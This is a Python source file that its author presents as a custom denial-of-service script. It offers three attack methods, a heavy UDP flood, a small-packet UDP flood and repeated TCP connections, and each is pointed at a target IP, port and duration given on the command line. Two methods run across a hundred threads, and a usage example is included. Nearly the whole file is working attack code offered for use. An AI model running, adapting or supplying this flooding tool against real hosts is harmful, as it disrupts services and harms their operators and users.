import os
import time
import socket
from os import system
from time import time
from sys import argv
#from random import randint as _urandom
#from random import _urandom
#from random import os.urandom
from threading import Thread
from socket import socket, AF_INET, SOCK_DGRAM, SOCK_STREAM

# Created by: CodesParadox
# Created on: 20-01-2023
# Version: 1.0
# Language: Python
# Description: Custom Python DoS (Denial of Service) Script | 3 Methods


#Custom Python DoS (Denial of Service) Script | 3 Methods
 
#UDP  : Heavy UDP Flood      | High - Very High Bandwidth
#PPS  : Small UDP Packets    | Medium - High Bandwidth
#SOCK : TCP Socket Spam      | Very Low - Low Bandwidth
 
#Use of python script: python / python3 <filename>.py <method> <ip> <port> <time>  | Method is case insensitive.
#Example of python script: python DoS.py sock 1.1.1.1 80 60

def raise_exception(message):
    raise Exception(message)

#start tcp socket spam method (light) | very low - low bandwidth usage

def start_sock(host, port, secs):
    timeout = int(time()) + int(secs)
    while int(time()) <= int(timeout):
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.connect((host, int(port)))
            sock.close()
        except KeyboardInterrupt:
            exit()
        except:
            continue

#start udp flood method (medium) | medium - high bandwidth usage
def start_pps(host, port, secs):
    sock = socket(AF_INET, SOCK_DGRAM)
    timeout = int(time()) + int(secs)
    while int(time()) <= int(timeout):
        try:
            random_byte = os.urandom(1)
            sock.sendto(random_byte, (host, int(port)))
        except KeyboardInterrupt:
            exit()
        except:
            continue

#start udp flood method (heavy) | high - very high bandwidth usage | use with caution
#use of this method may cause your internet to disconnect

def start_udp(host, port, secs):
    sock = socket(AF_INET, SOCK_DGRAM)
    timeout = int(time()) + int(secs)
    while int(time()) <= int(timeout):
        try:
            random_data = os.urandom(256)
            sock.sendto(random_data, (host, int(port)))
        except KeyboardInterrupt:
            exit()
        except:
            continue





class Public():

    def __init__(self) -> None:
        self.host = host[0]
        self.port = port[0]
        self.secs = secs[0]
        host.clear()
        port.clear()
        secs.clear()

    def main(self):
        if argv[1].lower() in ["udp"]:
            start_udp(self.host, self.port, self.secs)

        if argv[1].lower() in ["pps"]:
            for _ in range(100):
                try:
                    Thread(target = start_pps, args = [ self.host, self.port, self.secs ], daemon = True).start()
                except:
                    continue
            start_pps(self.host, self.port, self.secs)

        if argv[1].lower() in ["sock"]:
            for _ in range(100):
                try:
                    Thread(target = start_sock, args = [ self.host, self.port, self.secs ], daemon = True).start()
                except:
                    continue
            start_sock(self.host, self.port, self.secs)

if __name__ == "__main__":
    try:
        host = [ argv[2] ]
        port = [ argv[3] if argv[3].isdigit() else raise_exception("Port value must be an integer.") ]
        secs = [ argv[4] if argv[4].isdigit() else raise_exception("Time value must be an integer.")  ]
    except IndexError:
        print("Missing values.")
    Public.main(Public())